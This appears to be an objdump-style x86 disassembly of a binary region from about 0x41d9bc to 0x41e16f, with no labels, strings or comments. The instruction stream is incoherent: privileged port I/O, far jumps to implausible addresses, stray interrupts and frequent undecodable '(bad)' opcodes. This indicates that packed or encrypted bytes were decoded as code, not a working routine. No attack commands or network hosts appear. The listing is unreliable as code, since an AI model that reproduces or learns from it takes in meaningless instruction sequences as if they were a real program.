  41d9bc:	mov    ds,WORD PTR [eax+0x2c]
  41d9bf:	dec    ecx
  41d9c0:	dec    eax
  41d9c1:	cli    
  41d9c2:	xchg   ecx,eax
  41d9c3:	xor    eax,0xe71c65e
  41d9c8:	jnp    0x41d964
  41d9ca:	into   
  41d9cb:	addr16 sub ah,bl
  41d9ce:	retf   0xcc83
  41d9d1:	jmp    0xe4cfbdef
  41d9d6:	sub    bl,BYTE PTR [esi-0x7d]
  41d9d9:	retf   
  41d9da:	test   edx,esp
  41d9dc:	pop    ecx
  41d9dd:	mov    al,ds:0x94e0617a
  41d9e2:	fstp   TBYTE PTR [edx-0x1f8283b1]
  41d9e8:	push   edx
  41d9e9:	push   es
  41d9ea:	mov    ds:0x69b59bc1,eax
  41d9ef:	iret   
  41d9f0:	add    eax,0x8d54c88a
  41d9f5:	ja     0x41da0a
  41d9f7:	push   0x20
  41d9f9:	rol    ebx,0x78
  41d9fc:	shl    DWORD PTR [ebx],cl
  41d9fe:	stc    
  41d9ff:	jmp    0x8e0e2943
  41da04:	pop    edi
  41da05:	lea    esi,[edx-0x5b0225cf]
  41da0b:	or     eax,ecx
  41da0d:	pop    edi
  41da0e:	pop    eax
  41da0f:	dec    esp
  41da10:	sti    
  41da11:	fs add ecx,ecx
  41da14:	push   edi
  41da15:	add    bh,BYTE PTR [eax]
  41da17:	push   es
  41da18:	add    al,0xfa
  41da1a:	push   ss
  41da1b:	out    0xad,eax
  41da1d:	adc    BYTE PTR [ebx+ecx*8-0x11],ch
  41da21:	push   ebx
  41da22:	push   0x3d852466
  41da27:	fcom   QWORD PTR [ebx-0xb64e2ba]
  41da2d:	cmp    DWORD PTR [esi],ebp
  41da2f:	push   0x6f
  41da31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da32:	push   edx
  41da33:	int    0x37
  41da35:	jae    0xd3ff7345
  41da3b:	aaa    
  41da3c:	shl    BYTE PTR [ecx+0x6610be7d],1
  41da42:	jae    0x41da92
  41da44:	test   al,0xc0
  41da46:	addr16 je 0x41d9e9
  41da49:	pop    ecx
  41da4a:	mov    ebp,0xb6b8d408
  41da4f:	jno    0x41da73
  41da51:	leave  
  41da52:	pop    ss
  41da53:	and    dl,cl
  41da55:	xor    eax,0x778e92a1
  41da5a:	jnp    0x41da5b
  41da5c:	jp     0x41d9de
  41da5e:	fisub  WORD PTR [ebx+0x74a444e9]
  41da64:	jp     0x41da98
  41da66:	lock mov ebx,0x1e9a9925
  41da6c:	repnz clc 
  41da6e:	pusha  
  41da6f:	or     eax,0x81b70849
  41da74:	mov    esp,DWORD PTR [eax]
  41da76:	mov    es,edx
  41da78:	mov    al,0x13
  41da7a:	bound  edi,QWORD PTR [ecx-0x33350137]
  41da80:	out    dx,al
  41da81:	out    0x7e,eax
  41da83:	sub    DWORD PTR [esi+0x35],ecx
  41da86:	test   edi,0xd2168ddf
  41da8c:	scas   al,BYTE PTR es:[edi]
  41da8d:	push   cs
  41da8e:	js     0x41da46
  41da90:	jge    0x41daa6
  41da92:	sbb    esi,ebx
  41da94:	aaa    
  41da95:	aad    0x41
  41da97:	and    ebx,DWORD PTR [ebx+eax*1-0x5732a91c]
  41da9e:	mov    ebx,0xa43836e3
  41daa3:	aad    0x1b
  41daa5:	aam    0x5f
  41daa7:	je     0x41da4e
  41daa9:	repnz push eax
  41daab:	xchg   esp,eax
  41daac:	mov    ah,0x10
  41daae:	(bad)  
  41daaf:	repnz sti 
  41dab1:	or     DWORD PTR [ebp+0x6714596d],eax
  41dab7:	push   ecx
  41dab8:	push   ds
  41dab9:	and    al,0x1d
  41dabb:	fadd   DWORD PTR [ebx]
  41dabd:	xchg   esp,eax
  41dabe:	test   eax,0x6d974322
  41dac3:	jmp    0x433:0x85002c68
  41daca:	sbb    DWORD PTR [esi+ebx*4+0x7d],ecx
  41dace:	adc    cl,BYTE PTR [ebx+edi*2+0x5ffa6b80]
  41dad5:	nop
  41dad6:	xchg   ebx,eax
  41dad7:	adc    DWORD PTR [ebx+0x528afb5a],0xc61a8a01
  41dae1:	mov    esp,0x3886c9a5
  41dae6:	fdiv   DWORD PTR [eax-0x4f]
  41dae9:	ror    edx,1
  41daeb:	sbb    BYTE PTR [ebx-0x5c3705c0],dl
  41daf1:	push   ebp
  41daf2:	idiv   edi
  41daf4:	dec    eax
  41daf5:	outs   dx,BYTE PTR ds:[esi]
  41daf6:	push   ss
  41daf7:	repz mov cl,0x20
  41dafa:	jno    0x41db0b
  41dafc:	lods   al,BYTE PTR ds:[esi]
  41dafd:	cs sbb al,0xc3
  41db00:	sbb    DWORD PTR ds:0xadd8a2e8,0xffffffa0
  41db07:	cmc    
  41db08:	das    
  41db09:	add    eax,0xa052e02b
  41db0e:	dec    esp
  41db0f:	cli    
  41db10:	out    dx,eax
  41db11:	test   eax,0xf68341df
  41db16:	addr16 mov ch,0x7d
  41db19:	rcr    DWORD PTR [ebx+0x6f97b317],cl
  41db1f:	sub    ch,BYTE PTR [ebp-0x2f]
  41db22:	xchg   ebp,eax
  41db23:	stc    
  41db24:	adc    BYTE PTR [ebp-0x23e3f561],bh
  41db2a:	das    
  41db2b:	inc    ebp
  41db2c:	jnp    0x41dac0
  41db2e:	inc    edi
  41db2f:	pop    ds
  41db30:	dec    ecx
  41db31:	ins    DWORD PTR es:[edi],dx
  41db32:	xor    esi,edi
  41db34:	lea    ebp,[eax-0x29]
  41db37:	mov    eax,0xc904323a
  41db3c:	dec    ebx
  41db3d:	push   edx
  41db3e:	stc    
  41db3f:	mov    ebp,0xfb101105
  41db44:	imul   eax,DWORD PTR [ecx+0x627b00be],0xfffffff7
  41db4b:	dec    esp
  41db4c:	or     BYTE PTR ds:0x1246214e,dl
  41db52:	inc    ebp
  41db53:	repnz aaa 
  41db55:	rol    DWORD PTR [ebp-0x6d],1
  41db58:	rcr    DWORD PTR [esi],cl
  41db5a:	jb     0x41daf9
  41db5c:	fisub  WORD PTR [edx]
  41db5e:	adc    ebp,edx
  41db60:	sbb    eax,0xf259df92
  41db65:	or     BYTE PTR [esi-0x14],cl
  41db68:	push   ebp
  41db69:	adc    BYTE PTR [esi-0x1d86f747],0xbc
  41db70:	inc    esp
  41db71:	mov    cs,WORD PTR [eax]
  41db73:	inc    edi
  41db74:	jne    0x41db2d
  41db76:	cwde   
  41db77:	mov    eax,0x1d408f68
  41db7c:	and    ah,BYTE PTR [ebp-0x2b9aa332]
  41db82:	sahf   
  41db83:	pop    esp
  41db84:	pop    ebx
  41db85:	push   edi
  41db86:	xchg   bh,ch
  41db88:	fcomp  DWORD PTR [esi+esi*4]
  41db8b:	push   edi
  41db8c:	inc    esi
  41db8d:	push   cs
  41db8e:	dec    esp
  41db8f:	repz xor bl,ah
  41db92:	pop    ss
  41db93:	push   ebp
  41db94:	fmul   QWORD PTR ds:0xbc96469b
  41db9a:	add    eax,0x21c1d5c
  41db9f:	dec    edi
  41dba0:	cmovnp ecx,eax
  41dba3:	fdivr  QWORD PTR [edx-0x3e96d479]
  41dba9:	imul   DWORD PTR [esi-0x5a]
  41dbac:	mov    dl,0xb9
  41dbae:	pop    edx
  41dbaf:	jge    0x41dbd4
  41dbb1:	fdiv   QWORD PTR [edi-0x65]
  41dbb4:	dec    edx
  41dbb5:	mov    DWORD PTR [edi+0x468966c1],ebp
  41dbbb:	mov    bl,ah
  41dbbd:	(bad)  
  41dbbe:	dec    ebp
  41dbbf:	ins    DWORD PTR es:[edi],dx
  41dbc0:	add    BYTE PTR [esi+0x49],cl
  41dbc3:	cmp    al,0xe9
  41dbc5:	das    
  41dbc6:	fdivrp st(2),st
  41dbc8:	jmp    0xae7890ca
  41dbcd:	dec    ebp
  41dbce:	mov    bl,0x22
  41dbd0:	push   0xffffffd7
  41dbd2:	or     BYTE PTR [eax+0x238fee5a],dl
  41dbd8:	adc    al,0x19
  41dbda:	shl    dl,0x61
  41dbdd:	jo     0x41dbc4
  41dbdf:	mov    ds:0xee9352fd,eax
  41dbe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbe5:	mov    ah,0xaf
  41dbe7:	loop   0x41db76
  41dbe9:	xchg   ecx,eax
  41dbea:	xor    al,al
  41dbec:	gs push ebp
  41dbee:	xchg   esp,eax
  41dbef:	pop    edi
  41dbf0:	jns    0x41dc20
  41dbf2:	popa   
  41dbf3:	and    DWORD PTR [esi-0x40d16362],ebp
  41dbf9:	jecxz  0x41dbb7
  41dbfb:	in     eax,0x57
  41dbfd:	sti    
  41dbfe:	sub    al,0x92
  41dc00:	or     al,0x12
  41dc02:	daa    
  41dc03:	test   al,0x25
  41dc05:	mov    esi,0xea1087d4
  41dc0a:	idiv   eax
  41dc0c:	mov    ebx,edi
  41dc0e:	mov    ch,cl
  41dc10:	sub    DWORD PTR [ebp-0x61],ecx
  41dc13:	dec    esp
  41dc14:	std    
  41dc15:	stos   BYTE PTR es:[edi],al
  41dc16:	cdq    
  41dc17:	lea    eax,[eax-0x4eb5d47c]
  41dc1d:	fucomip st,st(1)
  41dc1f:	xor    eax,0x35ddb6b7
  41dc24:	loop   0x41dc44
  41dc26:	add    al,0x37
  41dc28:	cmp    DWORD PTR [eax-0x292699f],esp
  41dc2e:	cwde   
  41dc2f:	ins    DWORD PTR es:[edi],dx
  41dc30:	js     0x41dbfd
  41dc32:	mov    al,0xd9
  41dc34:	sub    al,0xc4
  41dc36:	add    bh,BYTE PTR [edi-0x2aa87896]
  41dc3c:	push   0x3d7d327b
  41dc41:	inc    ecx
  41dc42:	cmc    
  41dc43:	sbb    al,0xa2
  41dc45:	mov    eax,0x76083b74
  41dc4a:	fsubr  QWORD PTR [edx-0x17]
  41dc4d:	dec    ecx
  41dc4e:	bound  esi,QWORD PTR ds:0x23b27e3c
  41dc54:	in     eax,0xb
  41dc56:	fld    DWORD PTR [ebp+0x12]
  41dc59:	sbb    edi,ecx
  41dc5b:	sbb    DWORD PTR [ecx+0x50],0xec811711
  41dc62:	jl     0x41dc0e
  41dc64:	loop   0x41dc98
  41dc66:	sbb    dh,bl
  41dc68:	ds push edi
  41dc6a:	xchg   edx,eax
  41dc6b:	in     eax,0xaa
  41dc6d:	cmc    
  41dc6e:	inc    eax
  41dc6f:	ins    DWORD PTR es:[edi],dx
  41dc70:	in     al,dx
  41dc71:	mov    WORD PTR [ecx-0x28],fs
  41dc74:	ins    BYTE PTR es:[edi],dx
  41dc75:	(bad)  
  41dc77:	shr    DWORD PTR [esi],0xe0
  41dc7a:	add    al,BYTE PTR [ebp+0x30]
  41dc7d:	xor    DWORD PTR [esi-0x6f9a7afc],esp
  41dc83:	sub    DWORD PTR [ebx+0x2d],eax
  41dc86:	jb     0x41dc3e
  41dc88:	sub    BYTE PTR [ebx+0x423402d5],0x82
  41dc8f:	adc    BYTE PTR [edx+0x2a693e4a],dl
  41dc95:	jg     0x41dc75
  41dc97:	cmp    BYTE PTR [edi],ch
  41dc99:	jo     0x41dc79
  41dc9b:	cs mov sp,0xa7fe
  41dca0:	dec    edx
  41dca1:	sub    al,0x56
  41dca3:	stc    
  41dca4:	sub    bh,bh
  41dca6:	adc    esp,ecx
  41dca8:	iret   
  41dca9:	fdivp  st(7),st
  41dcab:	aas    
  41dcac:	ret    
  41dcad:	xor    edx,edx
  41dcaf:	mov    edx,0xfc597c6a
  41dcb4:	push   ebp
  41dcb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcb6:	fld    DWORD PTR [ecx-0x4dabfb08]
  41dcbc:	vminpd ymm3,ymm3,YMMWORD PTR [edi+0xa]
  41dcc1:	mov    ah,0x30
  41dcc3:	gs jbe 0x41dd36
  41dcc6:	in     al,0xbc
  41dcc8:	jge    0x41dcb8
  41dcca:	add    DWORD PTR [edx],esi
  41dccc:	retf   0x877d
  41dccf:	loop   0x41dc7a
  41dcd1:	and    edi,ecx
  41dcd3:	jecxz  0x41dc85
  41dcd5:	pop    esp
  41dcd6:	inc    DWORD PTR [esi]
  41dcd8:	arpl   sp,bp
  41dcda:	or     al,0xc5
  41dcdc:	lods   eax,DWORD PTR ds:[esi]
  41dcdd:	sub    al,0x43
  41dcdf:	stc    
  41dce0:	imul   ebx,DWORD PTR [esi-0x449d4b8d],0xe7523d7e
  41dcea:	push   0xfffffffb
  41dcec:	in     al,dx
  41dced:	add    bh,BYTE PTR [ecx+0x43c4b20d]
  41dcf3:	and    bl,BYTE PTR [edx-0x326e8b0]
  41dcf9:	(bad)  
  41dcfb:	fnstsw WORD PTR [edi+0x62da4807]
  41dd01:	in     eax,0x8e
  41dd03:	sar    ebp,cl
  41dd05:	std    
  41dd06:	repnz (bad) 
  41dd08:	and    BYTE PTR [ecx+0x76],ah
  41dd0b:	dec    ebx
  41dd0c:	inc    esp
  41dd0d:	add    BYTE PTR [edi-0x73],bh
  41dd10:	pushf  
  41dd11:	es jo  0x41dd85
  41dd14:	jle    0x41dcc3
  41dd16:	xor    al,0xb8
  41dd18:	add    BYTE PTR [esi+0x24464da3],0xb9
  41dd1f:	(bad)  
  41dd20:	test   eax,0xfbd3c9f9
  41dd25:	xor    DWORD PTR [esi+0x70],edi
  41dd28:	adc    BYTE PTR [ebx],0xe5
  41dd2b:	sahf   
  41dd2c:	push   edi
  41dd2d:	jmp    0x41dd90
  41dd2f:	mov    al,ds:0x840df3cf
  41dd34:	mov    ds:0x847c363,al
  41dd39:	in     eax,dx
  41dd3a:	inc    ebx
  41dd3b:	cmp    BYTE PTR [edi-0x2d],0x53
  41dd3f:	ret    
  41dd40:	sbb    al,0x6a
  41dd42:	xor    DWORD PTR [ebx-0x5e],0x98bf7fb1
  41dd49:	out    dx,eax
  41dd4a:	push   ebp
  41dd4b:	mov    bl,0xd5
  41dd4d:	jg     0x41dd09
  41dd4f:	aaa    
  41dd50:	aaa    
  41dd51:	add    eax,0xe380b84f
  41dd56:	xor    DWORD PTR ds:0xdc35aec0,esp
  41dd5c:	pop    esi
  41dd5d:	ret    0x8ae9
  41dd60:	stc    
  41dd61:	test   BYTE PTR [edx+0x45598b1d],0xa0
  41dd68:	dec    ebp
  41dd69:	lds    ebx,FWORD PTR [ebx+esi*2]
  41dd6c:	sbb    al,0x68
  41dd6e:	mov    al,0x51
  41dd70:	fcomi  st,st(6)
  41dd72:	pop    esp
  41dd73:	mov    ds:0x666844f6,eax
  41dd78:	rcl    DWORD PTR [edx-0xc],0xa5
  41dd7c:	cmp    edi,DWORD PTR [ebp-0x74]
  41dd7f:	rcr    DWORD PTR [edx],1
  41dd81:	sar    al,1
  41dd83:	jns    0x41ddd0
  41dd85:	mov    bh,0xea
  41dd87:	dec    eax
  41dd88:	sbb    al,0x19
  41dd8a:	xchg   ecx,eax
  41dd8b:	cmc    
  41dd8c:	jl     0x41dd2c
  41dd8e:	push   es
  41dd8f:	in     al,0x62
  41dd91:	mov    ebp,0xa74f2406
  41dd96:	call   0x78d3db93
  41dd9b:	sub    eax,0xd552a030
  41dda0:	xor    BYTE PTR [eax+0x2eedb227],dh
  41dda6:	aad    0x4b
  41dda8:	mov    ebp,0x2a76dcdf
  41ddad:	sti    
  41ddae:	mov    edi,fs
  41ddb0:	push   eax
  41ddb1:	add    esi,DWORD PTR [ebx+0x6aa6ee42]
  41ddb7:	daa    
  41ddb8:	adc    esp,DWORD PTR [ecx]
  41ddba:	jg     0x41ddf3
  41ddbc:	test   DWORD PTR [eax-0x38407559],esp
  41ddc2:	ret    0xc242
  41ddc5:	jmp    0x41dde1
  41ddc7:	popa   
  41ddc8:	add    eax,0xfca7706b
  41ddcd:	aaa    
  41ddce:	gs push 0x158d2381
  41ddd4:	and    eax,0xe14344da
  41ddd9:	lods   eax,DWORD PTR ds:[esi]
  41ddda:	inc    esi
  41dddb:	ins    BYTE PTR es:[edi],dx
  41dddc:	mov    esi,ds
  41ddde:	xchg   esi,eax
  41dddf:	jae    0x41dde6
  41dde1:	and    al,0x3
  41dde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dde4:	scas   eax,DWORD PTR es:[edi]
  41dde5:	pop    esp
  41dde6:	jmp    0x41de21
  41dde8:	ja     0x41de68
  41ddea:	sub    ecx,DWORD PTR [edi+esi*2-0x38]
  41ddee:	ret    0x90fb
  41ddf1:	xor    cl,dl
  41ddf3:	cmp    dl,BYTE PTR [edx+eiz*1+0x65465c55]
  41ddfa:	pop    esi
  41ddfb:	(bad)  
  41ddfc:	in     eax,dx
  41ddfd:	push   ecx
  41ddfe:	loop   0x41de36
  41de00:	xchg   esi,eax
  41de01:	cmp    ecx,DWORD PTR [edi+0x2c]
  41de04:	rcl    BYTE PTR [eax+0x4a],0x24
  41de08:	dec    ebp
  41de09:	fist   WORD PTR [edi]
  41de0b:	sub    BYTE PTR [edx],bl
  41de0d:	dec    ecx
  41de0e:	add    DWORD PTR [edx+edx*2+0x21443cdb],esi
  41de15:	fdiv   QWORD PTR [ebp+0x16]
  41de18:	and    dl,BYTE PTR [eax-0x4e288520]
  41de1e:	push   ebp
  41de1f:	xchg   ebx,eax
  41de20:	cs or  al,cl
  41de23:	adc    BYTE PTR [esi-0x80],0x26
  41de27:	stc    
  41de28:	xchg   BYTE PTR [eax],bh
  41de2a:	jmp    0x41de88
  41de2c:	loope  0x41de52
  41de2e:	jnp    0x41de16
  41de30:	xchg   DWORD PTR [edi+0x1c],ecx
  41de33:	xchg   ecx,eax
  41de34:	nop
  41de35:	retf   
  41de36:	into   
  41de37:	les    esp,FWORD PTR [edx-0x45]
  41de3a:	and    eax,0xdafbc47a
  41de3f:	iret   
  41de40:	idiv   DWORD PTR [edx-0x790e11ff]
  41de46:	pop    eax
  41de47:	in     eax,dx
  41de48:	arpl   WORD PTR [ebp+0x54200bad],di
  41de4e:	shr    BYTE PTR [edi+0x54],0x9
  41de52:	fstp   TBYTE PTR [ecx]
  41de54:	ds dec ecx
  41de56:	cdq    
  41de57:	inc    ecx
  41de58:	inc    edx
  41de59:	call   0x89480774
  41de5e:	inc    ebx
  41de5f:	pop    esp
  41de60:	mov    bl,0x90
  41de62:	mov    WORD PTR [ebp+0x73],es
  41de65:	es pusha 
  41de67:	clc    
  41de68:	(bad)  
  41de69:	ss daa 
  41de6b:	dec    ebp
  41de6c:	push   ss
  41de6d:	clc    
  41de6e:	xor    bl,BYTE PTR [ecx+0x1821c4f8]
  41de74:	dec    edi
  41de75:	jne    0x41de1a
  41de77:	pop    ss
  41de78:	xor    edi,edi
  41de7a:	imul   ebp,DWORD PTR [edi-0x25],0xf253a1d1
  41de81:	shl    DWORD PTR [ecx+0x58],0xb3
  41de85:	mov    ss,eax
  41de87:	shl    BYTE PTR [esi],0xe0
  41de8a:	repnz movs WORD PTR es:[edi],WORD PTR ds:[esi]
  41de8d:	or     ax,WORD PTR [esi+0x6563412d]
  41de94:	dec    ebp
  41de95:	sbb    dh,0xef
  41de98:	push   cs
  41de99:	not    DWORD PTR [eax+0x7527d628]
  41de9f:	jecxz  0x41ded9
  41dea1:	in     eax,0xc1
  41dea3:	pop    edi
  41dea4:	mov    dh,0x8f
  41dea6:	pop    ss
  41dea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dea8:	push   ecx
  41dea9:	mov    eax,0xd887b23a
  41deae:	adc    al,BYTE PTR ds:0xab6a63bb
  41deb4:	cmp    ebp,DWORD PTR [ecx-0x64]
  41deb7:	retf   0x3119
  41deba:	in     eax,0x8f
  41debc:	xor    al,0x8a
  41debe:	mov    al,0x67
  41dec0:	pop    ecx
  41dec1:	push   ds
  41dec2:	push   edi
  41dec3:	xor    DWORD PTR [edi],edi
  41dec5:	xchg   BYTE PTR [ebx+0x23],ah
  41dec8:	jl     0x41deda
  41deca:	cmp    bl,cl
  41decc:	mov    edx,0x1d054294
  41ded1:	push   esp
  41ded2:	xor    DWORD PTR [eax+0x3b20a3c5],edx
  41ded8:	fldlg2 
  41deda:	js     0x41deb4
  41dedc:	sbb    DWORD PTR [eax*4-0x41ac0260],edx
  41dee3:	jo     0x41df02
  41dee5:	mov    esi,0x5cad9590
  41deea:	push   ebp
  41deeb:	(bad)  
  41deec:	dec    edi
  41deed:	call   0x805d0cf9
  41def2:	inc    edx
  41def3:	movq   QWORD PTR [edi+0x76d15828],mm3
  41defa:	fs xchg edx,eax
  41defc:	jl     0x41df16
  41defe:	int    0xfc
  41df00:	mov    edi,DWORD PTR [esi]
  41df02:	push   esi
  41df03:	mov    esi,0x43d0695b
  41df08:	in     al,0x3f
  41df0a:	(bad)  
  41df0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df0d:	imul   ecx,DWORD PTR [esp+ebx*8+0x1280ec7a],0xffffffca
  41df15:	jo     0x41df32
  41df17:	fcomp  DWORD PTR [edx]
  41df19:	and    eax,DWORD PTR [edi]
  41df1b:	les    eax,FWORD PTR [esi-0x3e276f0f]
  41df21:	push   cs
  41df22:	retf   
  41df23:	(bad)  
  41df24:	cmp    eax,0xe33dee37
  41df29:	sbb    bl,0xf6
  41df2c:	xchg   esi,eax
  41df2d:	jecxz  0x41dee4
  41df2f:	outs   dx,DWORD PTR ds:[esi]
  41df30:	outs   dx,DWORD PTR ds:[esi]
  41df31:	inc    ebp
  41df32:	shr    DWORD PTR [edi],1
  41df34:	popf   
  41df35:	add    ch,dh
  41df37:	fxam   
  41df39:	xor    BYTE PTR [ebx],al
  41df3b:	js     0x41dee2
  41df3d:	shl    DWORD PTR [eax-0x1b6d728a],1
  41df43:	nop
  41df44:	les    edx,FWORD PTR [edi]
  41df46:	pop    ebp
  41df47:	adc    ebp,ecx
  41df49:	push   edi
  41df4a:	frstor [esp+edi*2+0x52d3c2c7]
  41df51:	in     al,dx
  41df52:	mov    ds:0xcd51d60,eax
  41df57:	xor    dh,bh
  41df59:	push   eax
  41df5a:	retf   
  41df5b:	clc    
  41df5c:	int    0xfb
  41df5e:	test   ebx,esp
  41df60:	cmp    al,0x24
  41df62:	mov    ch,0xa8
  41df64:	adc    eax,0xfa512aaf
  41df69:	mov    edi,DWORD PTR [eax]
  41df6b:	and    DWORD PTR [ebp+0x7f35f127],eax
  41df71:	nop
  41df72:	jmp    0xe5ff:0xa5c9857
  41df79:	ret    
  41df7a:	inc    ecx
  41df7b:	inc    ebx
  41df7c:	mov    bh,0xcd
  41df7e:	scas   al,BYTE PTR es:[edi]
  41df7f:	xor    DWORD PTR gs:[ebx],0x65
  41df83:	adc    al,0xa7
  41df85:	cmp    eax,0xc27b0796
  41df8a:	or     DWORD PTR [edi],edx
  41df8c:	jp     0x41dfec
  41df8e:	pop    es
  41df8f:	mov    ds:0xbb26484d,eax
  41df94:	cld    
  41df95:	pop    es
  41df96:	mov    bh,0x67
  41df98:	(bad)  
  41df99:	cdq    
  41df9a:	sbb    eax,0x8bb27e13
  41df9f:	push   eax
  41dfa0:	and    DWORD PTR [ecx-0x2075f414],0x68
  41dfa7:	push   eax
  41dfa8:	call   0x52:0xeb6bdcc3
  41dfaf:	mov    esi,0x66bfc99d
  41dfb4:	es ins DWORD PTR es:[edi],dx
  41dfb6:	repnz mov eax,gs:0x681cac67
  41dfbd:	popa   
  41dfbe:	aas    
  41dfbf:	out    0x1e,eax
  41dfc1:	adc    ch,BYTE PTR [edi+0x51]
  41dfc4:	jne    0x41dfbd
  41dfc6:	fs mov ecx,0xee4fc08f
  41dfcc:	rol    cl,0xbc
  41dfcf:	mov    edi,0x90b4db86
  41dfd4:	adc    eax,0xa33b9fb0
  41dfd9:	leave  
  41dfda:	xor    DWORD PTR [edi],ebx
  41dfdc:	scas   eax,DWORD PTR es:[edi]
  41dfdd:	jl     0x41dfa5
  41dfdf:	dec    ebp
  41dfe0:	pop    ss
  41dfe1:	in     eax,dx
  41dfe2:	pop    edi
  41dfe3:	loop   0x41e005
  41dfe5:	or     cl,BYTE PTR [ecx+ecx*1]
  41dfe8:	adc    eax,0xfc9fca2a
  41dfed:	push   0xffffff93
  41dfef:	js     0x41e056
  41dff1:	int3   
  41dff2:	jcxz   0x41e027
  41dff5:	push   ebp
  41dff6:	jnp    0x41e06e
  41dff8:	int    0x12
  41dffa:	jo     0x41e00c
  41dffc:	sar    BYTE PTR [ecx],1
  41dffe:	out    0xab,al
  41e000:	xchg   esi,eax
  41e001:	pushf  
  41e002:	inc    esi
  41e004:	retf   0xaa23
  41e007:	sbb    eax,0xa2bcdbbd
  41e00c:	dec    edi
  41e00d:	and    dl,al
  41e00f:	sub    cl,cl
  41e011:	scas   al,BYTE PTR es:[edi]
  41e012:	add    al,0x8
  41e014:	inc    esp
  41e015:	xor    al,0xb2
  41e017:	cmp    al,0xa5
  41e019:	adc    ecx,ebp
  41e01b:	in     eax,dx
  41e01c:	xor    al,0x79
  41e01e:	mov    bh,0xe4
  41e020:	push   edx
  41e021:	pop    es
  41e022:	rcr    DWORD PTR [esp+eax*1+0x2b3a729b],cl
  41e029:	xchg   ecx,eax
  41e02a:	add    ecx,edx
  41e02c:	lea    ecx,fs:[edx+0x41]
  41e030:	push   0xffffffd2
  41e032:	jle    0x41e01a
  41e034:	inc    edx
  41e035:	add    eax,0x42bec374
  41e03a:	add    BYTE PTR [ecx-0x4e],ch
  41e03d:	gs jg  0x41e065
  41e040:	repz inc edi
  41e042:	mov    bl,0xb
  41e044:	xchg   esi,eax
  41e045:	std    
  41e046:	inc    ebx
  41e047:	shr    DWORD PTR [esi],cl
  41e049:	js     0x41e001
  41e04b:	push   ebp
  41e04c:	push   ds
  41e04d:	scas   al,BYTE PTR es:[edi]
  41e04e:	push   esi
  41e04f:	pop    es
  41e050:	jnp    0x41e02e
  41e052:	pop    es
  41e053:	add    dl,ch
  41e055:	call   0xebe8:0x2a1ea5f5
  41e05c:	lods   al,BYTE PTR ds:[esi]
  41e05d:	pop    es
  41e05e:	sub    al,0x16
  41e060:	push   edi
  41e061:	push   esi
  41e062:	cmp    DWORD PTR [edi-0xc3cdf11],ebx
  41e068:	cmp    al,0x43
  41e06a:	sbb    al,0x6d
  41e06c:	jmp    0x6c53d1ea
  41e071:	fst    QWORD PTR [ecx+0x280b9125]
  41e077:	out    0xb1,al
  41e079:	or     ebx,DWORD PTR [bx+si+0x3143]
  41e07e:	xor    BYTE PTR [ecx+ecx*2+0x5a],cl
  41e082:	mov    dh,BYTE PTR [ebx]
  41e084:	enter  0xd75b,0x80
  41e088:	push   ecx
  41e089:	inc    esi
  41e08a:	push   ds
  41e08b:	cmc    
  41e08c:	repnz and DWORD PTR [ebp-0x3d],edx
  41e090:	ret    
  41e091:	adc    BYTE PTR [ebp-0xe033299],dl
  41e097:	jmp    0x99a20543
  41e09c:	call   0xad99:0x16c4d69b
  41e0a3:	mov    ebx,0xa27b750
  41e0a8:	dec    edx
  41e0a9:	ins    DWORD PTR es:[edi],dx
  41e0aa:	add    cl,BYTE PTR [eax+0x5a]
  41e0ad:	imul   eax,DWORD PTR ds:0xae879dc7,0xffffffd0
  41e0b4:	lahf   
  41e0b5:	js     0x41e11d
  41e0b7:	and    edi,ebp
  41e0b9:	es into 
  41e0bb:	sbb    bh,BYTE PTR [eax-0x10d657b3]
  41e0c1:	add    DWORD PTR [edi-0x76],ebx
  41e0c4:	push   esp
  41e0c5:	lds    ebp,FWORD PTR [eax+0x3a]
  41e0c8:	ins    BYTE PTR es:[edi],dx
  41e0c9:	lods   eax,DWORD PTR ds:[esi]
  41e0ca:	or     dl,cl
  41e0cc:	jae    0x41e050
  41e0ce:	xor    BYTE PTR [ebp-0x3a6f5be2],ah
  41e0d4:	inc    edi
  41e0d5:	sbb    dl,BYTE PTR [esi+0x22fd7e88]
  41e0db:	push   ebp
  41e0dc:	and    eax,0xec0c2c36
  41e0e1:	ss jo  0x41e157
  41e0e4:	xlat   BYTE PTR ds:[ebx]
  41e0e5:	mov    ?,WORD PTR [esi+0x2a]
  41e0e8:	mov    ah,0xbc
  41e0ea:	push   edx
  41e0eb:	call   DWORD PTR [ebx-0xc]
  41e0ee:	mov    dh,0xec
  41e0f0:	pop    sp
  41e0f2:	mov    ecx,0xf4855320
  41e0f7:	out    0x67,al
  41e0f9:	and    BYTE PTR [eax-0x39],0x77
  41e0fd:	addr16 jle 0x41e17a
  41e100:	add    esp,ebx
  41e102:	dec    ecx
  41e103:	int3   
  41e104:	les    edi,FWORD PTR [ecx-0x3c]
  41e107:	inc    eax
  41e108:	ret    0x23fd
  41e10b:	pushf  
  41e10c:	mov    al,0x9
  41e10e:	in     al,dx
  41e10f:	pop    edx
  41e110:	(bad)  
  41e111:	in     al,0xf7
  41e113:	push   ebx
  41e114:	cld    
  41e115:	mov    ds:0xf9547574,al
  41e11a:	popa   
  41e11b:	and    eax,0xaf0d6916
  41e120:	ss jg  0x41e123
  41e123:	sti    
  41e124:	xor    BYTE PTR [ebx+0x1b61cd67],dh
  41e12a:	and    cl,cl
  41e12c:	jmp    0x41e10e
  41e12e:	pop    ebx
  41e12f:	lea    esi,[esi-0x78ad0a85]
  41e135:	xlat   BYTE PTR ds:[ebx]
  41e136:	pop    es
  41e137:	stc    
  41e138:	in     eax,0xa4
  41e13a:	sbb    BYTE PTR gs:[ebx],ah
  41e13d:	dec    edi
  41e13e:	or     ah,dh
  41e140:	loop   0x41e14a
  41e142:	mov    bh,0xe
  41e144:	cmc    
  41e145:	cwde   
  41e146:	fs jmp 0xbb1f33b4
  41e14c:	or     al,0x8f
  41e14e:	arpl   WORD PTR ds:0x65f21874,si
  41e154:	push   ss
  41e155:	popf   
  41e156:	adc    eax,0xdd116c47
  41e15b:	push   0x5a
  41e15d:	or     BYTE PTR [esi+esi*8+0x70187fa4],dh
  41e164:	mov    eax,0x337bbaa0
  41e169:	stc    
  41e16a:	retf   0x3e5e
  41e16d:	or     al,0x52
  41e16f:	and    BYTE PTR [esi-0x6e4005a0],0x50
